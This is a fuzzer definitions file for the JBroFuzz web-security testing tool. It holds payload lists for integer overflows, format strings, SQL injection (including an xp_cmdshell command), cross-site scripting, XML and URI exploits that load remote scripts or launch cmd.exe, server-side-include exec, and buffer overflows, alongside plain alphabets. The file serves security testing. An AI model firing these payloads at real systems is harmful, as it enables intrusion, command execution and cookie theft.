# JBroFuzz Fuzzer Definitions for version 1.0
#
# -----------------------------------------------------------------------------
# Pre conditions
# -----------------------------------------------------------------------------
#
# Maximum number of lines		1024
# Maximum line length			512
#
# -----------------------------------------------------------------------------
# A bit of (fuzzing) theory 
# -----------------------------------------------------------------------------
#
# Fuzzers are clasified in the following two categories. These are:
# 
# -> Recursive Fuzzers (R)
#
# Recursive fuzzers iterate through all combinations of a set alphabet for 
# a given length. An example of this is a HEX-LOW fuzzer. This will attempt all 
# possible HEX requests for any given length. For example, if the length was, 
# say, 5 characters then a recursive fuzzer would attempt all combinations 
# from 00000 to fffff.
#
# -> Replacive Fuzzers (P)
#
# Replacive fuzzers substitute the selected range with the value given 
# from a given value list. An example of this is the XSS-XML fuzzer. This will
# attempt to check against XML cross site scripting attacks by substituting a 
# particular part of the request against the given value list. 
#
# -----------------------------------------------------------------------------
# What JBroFuzz supports (what you change in this file and will work)
# -----------------------------------------------------------------------------
#
# This version supports the alteration/addition of fuzzers based on the file
# format described below.
# 
# -----------------------------------------------------------------------------
# Adding a new Fuzzer (yes, you can brake JBroFuzz if you fuzz this file)
# -----------------------------------------------------------------------------
#
# This file is loaded at runtime. To add a fuzzer follow the syntax seen 
# below:
#
# C:XXX-XXX-XXX:Name:L
# > Category1 | Category2 | ... | CategoryN
# PAYLOAD_1
# PAYLOAD_2
# PAYLOAD_L
#
# Where:
#
# C : The character R or the character P : Stands for Recursive or Replacive
# XXX-XXX-XXX : The unique fuzzer id : Examples are XSS-XML-UPP or NUM-HEX-LOW
# Name : The name of the fuzzer : Examples are XSS XML Injection
# L : The number of payloads contained within the fuzzer
# Category : The category used to group fuzzers together : E.g. Buffer Overflows
# PAYLOAD : The actual payload value
#
# Pre:
#
# First line must have 4 fields divided by ":"
# First character must be "P" for Replacive or "R" for recursive
# XXX-XXX-XXX has to be unique and in batches of 3 letters long
# Name has to be less than or equal to 64 characters
# L has to be between [0-64]
# The total number of payloads, one per line has to be equal to the value of L
# Second line (describing the categories) must start with ">"
# Categories must be separated with a "|"
# 
# A simple fuzzer example is:
# 
# R:BIO-DNA-UPP:DNA Uppercase Fuzzer:4
# > Biology | English Characters
# G
# A
# T
# C
#
# -----------------------------------------------------------------------------
# Alphabet String Expansion (so that you don't get bored of pasting)
# -----------------------------------------------------------------------------
#
# A value line starting with "f(x)=" will be expanded provided it has the 
# character " x " between a String and a positive integer. 
#
# Here is an example:
#
# f(x)=A x 100 
# 
# Will produce a line of 100 A's
#
# Copyright (C) 2008 subere@uncon.org
# Version 1.0
#

P:INT-LOW:Lowercase Integer Overflows:12
> Exploits | Replacive Fuzzers | Integer Overflows | Lowercase Fuzzers
-1
0
0x100
0x1000
0x3fffffff
0x7ffffffe
0x7fffffff
0x80000000
0xfffffffe
0xffffffff
0x10000
0x100000

P:INT-UPP:Uppercase Integer Overflows:12
> Exploits | Replacive Fuzzers | Integer Overflows | Uppercase Fuzzers
-1
0
0x100
0x1000
0x3FFFFFFF
0x7FFFFFFE
0x7FFFFFFF
0x80000000
0xFFFFFFFE
0xFFFFFFFF
0x10000
0x100000


P:FSE-LOW:Lowercase Format Strings:19
> Exploits | Replacive Fuzzers | Format String Errors | Lowercase Fuzzers
%s%p%x%d
.1024d
%.2049d
%p%p%p%p
%x%x%x%x
%d%d%d%d
%s%s%s%s
%99999999999s
%08x
%%20d
%%20n
%%20x
%%20s
%s%s%s%s%s%s%s%s%s%s
%p%p%p%p%p%p%p%p%p%p
%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
f(x)=%s x 129
f(x)=%x x 257

P:FSE-UPP:Uppercase Format Strings:2
> Exploits | Replacive Fuzzers | Format String Errors | Uppercase Fuzzers
%X
f(x)=%X x 257

P:SQL-INJ:SQL Injection:12
> Replacive Fuzzers | SQL Injection
a'
?
' or 1=1
‘ or 1=1 --
x' AND userid IS NULL; --
x' AND email IS NULL; --
anything' OR 'x'='x
x' AND 1=(SELECT COUNT(*) FROM tabname); --
x' AND members.email IS NULL; --
x' OR full_name LIKE '%Bob%
23 OR 1=1
'; exec master..xp_cmdshell 'ping 172.10.1.255'--

P:XSS-ONE:Basic XSS:12
> Cross Site Scripting | Replacive Fuzzers
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=`javascript:alert("XSS says, 'XSS'")`>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">",
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
perl -e 'print "<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out
<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>

P:XSS-XML:XSS XML Injection:6
> Cross Site Scripting | XML Injection | Replacive Fuzzers
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(document.cookie);</html:script></html:html>

P:XSS-URI:URI XSS:4
> Cross Site Scripting | URI Exploits | Replacive Fuzzers
aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"
firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210

P:XSS-JSN:JSON:5
> Cross Site Scripting | Replacive Fuzzers
<body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;
<body onload=a1={x:this.parent.document};a1.x.writeln(1);>
<body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;
<body/s/onload=x={doc:parent.document};x.doc.writeln(1)
<body/â€?â€?$/onload=x={doc:parent[â€™documentâ€™]};x.doc.writeln(1)

P:XSS-SSI:Server Side Includes:1
> Cross Site Scripting | Replacive Fuzzers
<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->

P:XSS-URL-BRK:URL Breaking:3
> Cross Site Scripting | Replacive Fuzzers
http://aa"><script>alert(123)</script>
http://aa'><script>alert(123)</script>
http://aa<script>alert(123)</script>

R:NUM-HEX-LOW:Base16 (Hex) Lowercase:16
> Number Systems | Base | Recursive Fuzzers | Lowercase Fuzzers
0
1
2
3
4
5
6
7
8
9
a
b
c
d
e
f

R:NUM-HEX-UPP:Base16 (Hex) Uppercase:16
> Number Systems | Base | Recursive Fuzzers | Uppercase Fuzzers 
0
1
2
3
4
5
6
7
8
9
A
B
C
D
E
F

R:B10-DEC:Base10 (Decimal) Alphabet:10
> Number Systems | Base | Recursive Fuzzers
0
1
2
3
4
5
6
7
8
9

R:B08-OCT:Base08 (Octal) Alphabet:8
> Number Systems | Base | Recursive Fuzzers
0
1
2
3
4
5
6
7

R:B02-BIN:Base02 (Binary) Alphabet:2
> Number Systems | Base | Recursive Fuzzers
0
1

R:ALP-NUM-LOW:Alpha-Numeric Lowercase:36
> Alphabets | Recursive Fuzzers | Lowercase Fuzzers
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
0
1
2
3
4
5
6
7
8
9

R:ALP-NUM-UPP:Alpha-Numeric Uppercase:36
> Alphabets | Recursive Fuzzers | Uppercase Fuzzers
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
0
1
2
3
4
5
6
7
8
9

R:ALP-UPP:Alpha Uppercase:26
> Alphabets | Recursive Fuzzers | Uppercase Fuzzers
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z

R:ALP-LOW:Alpha Lowercase:26
> Alphabets | Recursive Fuzzers | Lowercase Fuzzers
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z

R:B64-RFC:Base64 Alphabet:64
> Alphabets | Number Systems | Base | Recursive Fuzzers
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
0
1
2
3
4
5
6
7
8
9
+
/
=

R:B64-URL:Base64 (URL/File Safe) Alphabet:64
> Alphabets | Number Systems | Base | Recursive Fuzzers
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
0
1
2
3
4
5
6
7
8
9
-
_
=

R:B32-RFC:Base32 Alphabet:32
> Alphabets | Number Systems | Base | Recursive Fuzzers | Uppercase Fuzzers
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
2
3
4
5
6
7
=

R:B32-HEX:Base32 (Extended Hex) Alphabet:32
> Alphabets | Number Systems | Base | Recursive Fuzzers | Uppercase Fuzzers
0
1
2
3
4
5
6
7
8
9
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
=

P:BFO-UPP:Long Uppercase AAA's:17
> Exploits | Buffer Overflows | Uppercase Fuzzers
A
f(x)=A x 3
f(x)=A x 5
f(x)=A x 9
f(x)=A x 17
f(x)=A x 33
f(x)=A x 65
f(x)=A x 129
f(x)=A x 257
f(x)=A x 513
f(x)=A x 1025
f(x)=A x 2049
f(x)=A x 4197
f(x)=A x 8193
f(x)=A x 16385
f(x)=A x 32769
f(x)=A x 65537

P:BFO-LOW:Long Lowercase aaa's:17
> Exploits | Buffer Overflows | Lowercase Fuzzers
a
f(x)=a x 3
f(x)=a x 5
f(x)=a x 9
f(x)=a x 17
f(x)=a x 33
f(x)=a x 65
f(x)=a x 129
f(x)=a x 257
f(x)=a x 513
f(x)=a x 1025
f(x)=a x 2049
f(x)=a x 4197
f(x)=a x 8193
f(x)=a x 16385
f(x)=a x 32769
f(x)=a x 65537

R:DNA-UPP:DNA Uppercase Fuzzer:4
> Biology | Recursive Fuzzers | Uppercase Fuzzers
A
T
C
G

R:DNA-LOW:DNA Lowercase Fuzzer:4
> Biology | Recursive Fuzzers | Lowercase Fuzzers
a
t
c
g
